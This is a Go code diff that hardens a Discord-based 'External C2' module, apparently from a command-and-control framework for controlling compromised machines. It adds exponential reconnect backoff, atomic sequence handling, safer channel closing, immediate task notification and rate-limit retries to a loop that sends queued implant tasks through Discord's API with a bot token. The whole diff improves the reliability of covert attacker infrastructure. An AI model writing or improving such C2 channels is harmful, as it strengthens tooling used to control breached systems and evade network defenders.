@@ -8,6 +8,7 @@ import (
 	"log/slog"
 	"net/http"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -20,7 +21,7 @@ type DiscordExternalC2 struct {
 	mu        sync.Mutex
 	running   bool
 	stopCh    chan struct{}
-	sequence  int
+	sequence  atomic.Int64
 	sessionID string
 }
 
@@ -59,6 +60,8 @@ func (d *DiscordExternalC2) Start() error {
 }
 
 func (d *DiscordExternalC2) runLoop(channelID string) {
+	wait := 5 * time.Second
+	const maxWait = 60 * time.Second
 	for {
 		d.connectAndRun(channelID)
 		select {
@@ -66,8 +69,12 @@ func (d *DiscordExternalC2) runLoop(channelID string) {
 			slog.Info("Discord External C2 stopped", "channel_id", d.channelID)
 			return
 		default:
-			slog.Info("Discord External C2 reconnecting in 5s", "channel_id", d.channelID)
-			time.Sleep(5 * time.Second)
+			slog.Info("Discord External C2 reconnecting", "channel_id", d.channelID, "wait", wait)
+			time.Sleep(wait)
+			wait *= 2
+			if wait > maxWait {
+				wait = maxWait
+			}
 		}
 	}
 }
@@ -84,6 +91,7 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 	}
 	defer conn.Close()
 
+	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
 	_, msg, err := conn.ReadMessage()
 	if err != nil {
 		slog.Error("Discord gateway read Hello failed", "error", err)
@@ -107,8 +115,11 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 	}
 
 	heartbeatDone := make(chan struct{})
+	var closeHeartbeatOnce sync.Once
+	closeHeartbeat := func() { closeHeartbeatOnce.Do(func() { close(heartbeatDone) }) }
+
 	go func() {
-		defer close(heartbeatDone)
+		defer closeHeartbeat()
 		ticker := time.NewTicker(heartbeatInterval)
 		defer ticker.Stop()
 		for {
@@ -118,10 +129,13 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 			case <-heartbeatDone:
 				return
 			case <-ticker.C:
-				hb, _ := json.Marshal(map[string]interface{}{
+				hb, ok := marshalJSONSafe(map[string]interface{}{
 					"op": 1,
-					"d":  d.sequence,
+					"d":  int(d.sequence.Load()),
 				})
+				if !ok {
+					continue
+				}
 				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
 				if err := conn.WriteMessage(websocket.TextMessage, hb); err != nil {
 					slog.Error("Discord heartbeat send failed", "error", err)
@@ -143,15 +157,23 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 			},
 		},
 	}
-	identifyJSON, _ := json.Marshal(identify)
+	identifyJSON, ok := marshalJSONSafe(identify)
+	if !ok {
+		closeHeartbeat()
+		return
+	}
 	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
 	if err := conn.WriteMessage(websocket.TextMessage, identifyJSON); err != nil {
 		slog.Error("Discord IDENTIFY send failed", "error", err)
-		close(heartbeatDone)
+		closeHeartbeat()
 		return
 	}
 
 	taskSenderDone := make(chan struct{})
+
+	d.server.extC2TaskMu.Lock()
+	d.server.extC2Notify[channelID] = make(chan struct{}, 1)
+	d.server.extC2TaskMu.Unlock()
 
 	go func() {
 		defer close(taskSenderDone)
@@ -161,15 +183,19 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 			select {
 			case <-d.stopCh:
 				return
+			case <-d.server.extC2Notify[channelID]:
 			case <-ticker.C:
-				d.server.extC2TaskMu.Lock()
-				tasks := d.server.extC2TaskQueue[channelID]
-				d.server.extC2TaskQueue[channelID] = nil
-				d.server.extC2TaskMu.Unlock()
-				for _, task := range tasks {
-					taskJSON, _ := json.Marshal(task)
-					d.sendRESTMessage(string(taskJSON))
+			}
+			d.server.extC2TaskMu.Lock()
+			tasks := d.server.extC2TaskQueue[channelID]
+			d.server.extC2TaskQueue[channelID] = nil
+			d.server.extC2TaskMu.Unlock()
+			for _, task := range tasks {
+				taskJSON, ok := marshalJSONSafe(task)
+				if !ok {
+					continue
 				}
+				d.sendRESTMessage(string(taskJSON))
 			}
 		}
 	}()
@@ -177,7 +203,7 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 	for {
 		select {
 		case <-d.stopCh:
-			close(heartbeatDone)
+			closeHeartbeat()
 			<-heartbeatDone
 			<-taskSenderDone
 			return
@@ -188,7 +214,7 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 		_, msg, err := conn.ReadMessage()
 		if err != nil {
 			slog.Error("Discord gateway read error", "channel_id", d.channelID, "error", err)
-			close(heartbeatDone)
+			closeHeartbeat()
 			<-heartbeatDone
 			<-taskSenderDone
 			return
@@ -205,26 +231,29 @@ func (d *DiscordExternalC2) connectAndRun(channelID string) {
 		}
 
 		if payload.S != nil {
-			d.sequence = *payload.S
+			d.sequence.Store(int64(*payload.S))
 		}
 
 		switch payload.Op {
 		case 1: // Heartbeat request
-			hb, _ := json.Marshal(map[string]interface{}{
+			hb, ok := marshalJSONSafe(map[string]interface{}{
 				"op": 1,
-				"d":  d.sequence,
+				"d":  int(d.sequence.Load()),
 			})
+			if !ok {
+				continue
+			}
 			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
 			conn.WriteMessage(websocket.TextMessage, hb)
 		case 7: // Reconnect
 			slog.Info("Discord: reconnect requested")
-			close(heartbeatDone)
+			closeHeartbeat()
 			<-heartbeatDone
 			<-taskSenderDone
 			return
 		case 9: // Invalid Session
 			slog.Warn("Discord: invalid session, reconnecting")
-			close(heartbeatDone)
+			closeHeartbeat()
 			<-heartbeatDone
 			<-taskSenderDone
 			return
@@ -274,39 +303,47 @@ func (d *DiscordExternalC2) processMessage(content, channelID string) {
 }
 
 func (d *DiscordExternalC2) sendRESTMessage(content string) {
-	url := fmt.Sprintf("https://discord.com/api/v10/channels/%s/messages", d.channelID)
-	body, _ := json.Marshal(map[string]string{"content": content})
-
-	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
-	if err != nil {
-		slog.Error("Discord REST request create failed", "error", err)
-		return
-	}
-	req.Header.Set("Authorization", "Bot "+d.botToken)
-	req.Header.Set("Content-Type", "application/json")
-
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		slog.Error("Discord REST send failed", "error", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode == 429 {
-		var rl struct {
-			RetryAfter float64 `json:"retry_after"`
-		}
-		if json.NewDecoder(resp.Body).Decode(&rl) == nil {
-			time.Sleep(time.Duration(rl.RetryAfter*1000) * time.Millisecond)
-			d.sendRESTMessage(content)
+	maxRetries := 3
+	for attempt := 0; attempt < maxRetries; attempt++ {
+		url := fmt.Sprintf("https://discord.com/api/v10/channels/%s/messages", d.channelID)
+		body, ok := marshalJSONSafe(map[string]string{"content": content})
+		if !ok {
 			return
 		}
-	}
 
-	if resp.StatusCode != 200 && resp.StatusCode != 201 {
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		slog.Error("Discord REST error", "status", resp.StatusCode, "body", string(bodyBytes))
+		req, err := http.NewRequest("POST", url, bytes.NewReader(body))
+		if err != nil {
+			slog.Error("Discord REST request create failed", "error", err)
+			return
+		}
+		req.Header.Set("Authorization", "Bot "+d.botToken)
+		req.Header.Set("Content-Type", "application/json")
+
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			slog.Error("Discord REST send failed", "error", err)
+			return
+		}
+		defer resp.Body.Close()
+
+		if resp.StatusCode == 429 {
+			var rl struct {
+				RetryAfter float64 `json:"retry_after"`
+			}
+			if json.NewDecoder(resp.Body).Decode(&rl) == nil {
+				time.Sleep(time.Duration(rl.RetryAfter*1000) * time.Millisecond)
+				continue
+			}
+			return
+		}
+
+		if resp.StatusCode != 200 && resp.StatusCode != 201 {
+			bodyBytes, _ := io.ReadAll(resp.Body)
+			slog.Error("Discord REST error", "status", resp.StatusCode, "body", string(bodyBytes))
+		}
+		return
 	}
+	slog.Warn("Discord REST rate limit retries exhausted", "max_retries", maxRetries)
 }
 
 func (d *DiscordExternalC2) Stop() {
